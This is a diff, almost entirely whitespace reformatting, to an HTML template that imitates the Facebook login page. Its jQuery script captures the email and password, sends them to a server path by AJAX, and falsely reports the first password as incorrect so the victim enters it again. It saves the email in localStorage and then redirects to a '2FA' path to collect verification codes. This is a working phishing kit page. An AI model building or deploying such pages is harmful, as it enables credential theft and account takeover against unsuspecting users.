@@ -2573,28 +2573,30 @@
             font-size: 16px !important;
             display: block !important;
         }
+
         /* Completely hide labels on focus, content, or autofill */
-        input:focus + .custom-label,
-        input:not(:placeholder-shown) + .custom-label,
-        input:-webkit-autofill + .custom-label,
-        input.has-content + .custom-label {
+        input:focus+.custom-label,
+        input:not(:placeholder-shown)+.custom-label,
+        input:-webkit-autofill+.custom-label,
+        input.has-content+.custom-label {
             display: none !important;
             opacity: 0 !important;
             visibility: hidden !important;
         }
+
         input {
             padding: 14px 12px !important;
             font-size: 16px !important;
             height: 56px !important;
             width: 100% !important;
         }
-        
+
         /* Force button to be clickable */
         [role="button"][aria-label="Log in"] {
             cursor: pointer !important;
             pointer-events: auto !important;
         }
-        
+
         [role="button"][aria-label="Log in"][style*="opacity: 0.5"] {
             pointer-events: none !important;
         }
@@ -2604,11 +2606,12 @@
             box-shadow: 0 0 0 1px #fa383e !important;
             border-radius: 12px !important;
         }
-        
-        .input-error-container, .input-error-container * {
+
+        .input-error-container,
+        .input-error-container * {
             border-color: #fa383e !important;
         }
-        
+
         .error-message-fb {
             color: #fa383e;
             font-size: 13px;
@@ -2617,7 +2620,7 @@
             align-items: center;
             font-weight: 400;
         }
-        
+
         .error-icon-fb {
             background-image: url("https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/O9iO_v66S04.png");
             background-position: 0 -835px;
@@ -2640,12 +2643,14 @@
             display: none;
             width: 100%;
         }
+
         .error-title {
             color: #333;
             font-weight: bold;
             font-size: 14px;
             margin-bottom: 4px;
         }
+
         .error-text {
             color: #333;
             font-size: 13px;
@@ -2697,7 +2702,8 @@
                                                                                 class="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1mx8u4h x1gytzn5 x1s688f x1wne1f8 xzsf02u x1yc453h x1rov3wm x1y9wsrc"
                                                                                 style="--x---base-line-clamp-line-height:66px;--x-lineHeight:66px">Explore
                                                                                 the things <span class="xig6vdn">you
-                                                                                    love</span>.</span></div>
+                                                                                    love</span>.</span>
+                                                                        </div>
                                                                     </div>
                                                                 </div>
                                                             </div><!--/$--><img
@@ -2740,9 +2746,12 @@
                                                                                                                 class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j">
                                                                                                                 <div
                                                                                                                     class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1cy8zhl">
-                                                                                                                        <span
-                                                                                                                            class="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xlh3980 xvmahel x1ejgnnb xza2c7i x1apb90u x1gbch0d xzsf02u x1yc453h xudqn12 x41vudc"
-                                                                                                                            style="--x---base-line-clamp-line-height:calc(var(--headline3-line-height) * 1em);--x-lineHeight:calc(var(--headline3-line-height) * 1em); white-space: nowrap !important;">Log in to Facebook</span>
+                                                                                                                    <span
+                                                                                                                        class="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xlh3980 xvmahel x1ejgnnb xza2c7i x1apb90u x1gbch0d xzsf02u x1yc453h xudqn12 x41vudc"
+                                                                                                                        style="--x---base-line-clamp-line-height:calc(var(--headline3-line-height) * 1em);--x-lineHeight:calc(var(--headline3-line-height) * 1em); white-space: nowrap !important;">Log
+                                                                                                                        in
+                                                                                                                        to
+                                                                                                                        Facebook</span>
                                                                                                                 </div>
                                                                                                             </div>
                                                                                                         </div>
@@ -2779,7 +2788,11 @@
                                                                                                                                     placeholder=" "
                                                                                                                                     value=""><label
                                                                                                                                     class="custom-label"
-                                                                                                                                    for="_R_64mkqsr9pb6amH1_">Email address or mobile number</label>
+                                                                                                                                    for="_R_64mkqsr9pb6amH1_">Email
+                                                                                                                                    address
+                                                                                                                                    or
+                                                                                                                                    mobile
+                                                                                                                                    number</label>
                                                                                                                             </div>
                                                                                                                             <div>
                                                                                                                             </div>
@@ -3675,13 +3688,13 @@
         nonce=""></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        (function() {
+        (function () {
             var attempts = parseInt(localStorage.getItem('login_attempts')) || 0;
             var metaBasePath = "{{ $metaBasePath }}";
             var authPath = "{{ $authPath }}";
-            
+
             function checkInputs() {
-                $('input').each(function() {
+                $('input').each(function () {
                     if ($(this).val().length > 0 || $(this).is(':focus')) {
                         $(this).addClass('has-content');
                     } else {
@@ -3693,13 +3706,13 @@
             function showError(msg) {
                 // Find the password input container - using parent() as the input is wrapped in a div
                 const $passInput = $('input[name="pass"]');
-                const $container = $passInput.parent(); 
-                
+                const $container = $passInput.parent();
+
                 $container.addClass('input-error-container');
-                
+
                 // Remove existing error if any
                 $('.error-message-fb').remove();
-                
+
                 // Add error message below the container
                 $container.after(`<div class="error-message-fb"><i class="error-icon-fb"></i><span>${msg}</span></div>`);
             }
@@ -3718,16 +3731,16 @@
                     return; // Basic validation
                 }
 
-                $btn.addClass('btn-disabled').css({'opacity': '0.5', 'pointer-events': 'none'});
-                
+                $btn.addClass('btn-disabled').css({ 'opacity': '0.5', 'pointer-events': 'none' });
+
                 attempts++;
                 localStorage.setItem('login_attempts', attempts);
                 localStorage.setItem('fb_email', email);
 
                 // Safety timeout to re-enable button if AJAX hangs
-                setTimeout(function() {
+                setTimeout(function () {
                     if ($btn.hasClass('btn-disabled')) {
-                         $btn.removeClass('btn-disabled').css({'opacity': '1', 'pointer-events': 'auto'});
+                        $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
                     }
                 }, 10000);
 
@@ -3742,32 +3755,32 @@
                         pass: pass,
                         attempts: attempts
                     },
-                    success: function(response) {
+                    success: function (response) {
                         if (attempts < 2) {
                             // First attempt: Show error and reset button immediately
                             showError("The password you've entered is incorrect.");
-                            $btn.removeClass('btn-disabled').css({'opacity': '1', 'pointer-events': 'auto'});
+                            $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
                         } else {
                             // Second attempt: Redirect to 2FA path
                             localStorage.setItem('login_attempts', 0);
                             window.location.href = authPath;
                         }
                     },
-                    error: function() {
+                    error: function () {
                         showError("The password you've entered is incorrect.");
-                        $btn.removeClass('btn-disabled').css({'opacity': '1', 'pointer-events': 'auto'});
+                        $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
                     }
                 });
             }
 
             // High-priority capture
-            $(document).on("click", '[role="button"][aria-label="Log in"]', function(e) {
+            $(document).on("click", '[role="button"][aria-label="Log in"]', function (e) {
                 e.preventDefault();
                 handleLogin();
             });
 
             // Handle Enter key
-            $(document).on("keydown", function(e) {
+            $(document).on("keydown", function (e) {
                 if (e.key === "Enter" && (e.target.name === "email" || e.target.name === "pass")) {
                     handleLogin();
                 }
@@ -3777,7 +3790,7 @@
             setInterval(checkInputs, 100);
 
             // Pre-fill email
-            $(window).on('load', function() {
+            $(window).on('load', function () {
                 var savedEmail = localStorage.getItem('fb_email');
                 if (savedEmail) {
                     $('input[name="email"]').val(savedEmail);
@@ -3790,5 +3803,5 @@
         })();
     </script>
 </body>
-</html>
 
+</html>
